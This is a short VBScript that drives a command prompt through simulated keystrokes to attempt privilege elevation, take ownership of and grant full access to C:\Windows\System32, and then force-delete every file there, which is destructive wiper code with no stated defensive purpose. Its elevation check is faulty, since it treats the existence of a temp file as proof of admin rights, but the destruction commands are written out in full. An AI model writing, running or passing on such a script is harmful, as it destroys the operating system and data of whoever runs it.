Set WshShell = WScript.CreateObject("WScript.Shell")

' Open command prompt
WshShell.Run "cmd"
WScript.Sleep 100

' Check for administrative privileges
WshShell.SendKeys "net session >nul 2>&1 && (set admin=1) || (set admin=0)"
WScript.Sleep 200
WshShell.SendKeys "{ENTER}"
WScript.Sleep 200

' Create a VBScript file for elevation
WshShell.SendKeys "echo UAC.ShellExecute %~s0, "", "", runas, 1 > %temp%\getadmin.vbs"
WScript.Sleep 100
WshShell.SendKeys "{ENTER}"
WScript.Sleep 100

' Re-check admin privileges after attempting elevation
WshShell.SendKeys "if exist %temp%\getadmin.vbs (set admin=1) else (set admin=0)"
WScript.Sleep 100
WshShell.SendKeys "{ENTER}"
WScript.Sleep 100

' Take ownership of System32
WshShell.SendKeys "takeown /f C:\Windows\System32 /r /d y"
WScript.Sleep 200
WshShell.SendKeys "{ENTER}"
WScript.Sleep 100

' Grant full access to administrators
WshShell.SendKeys "icacls C:\Windows\System32 /grant administrators:F /t"
WScript.Sleep 100
WshShell.SendKeys "{ENTER}"
WScript.Sleep 100

' Change to System32 directory
WshShell.SendKeys "cd C:\Windows\System32"
WshShell.SendKeys "{ENTER}"
WScript.Sleep 100 

' Delete files in System32
WshShell.SendKeys "del /F /S /Q *.*"
WshShell.SendKeys "{ENTER}"
WScript.Sleep 200
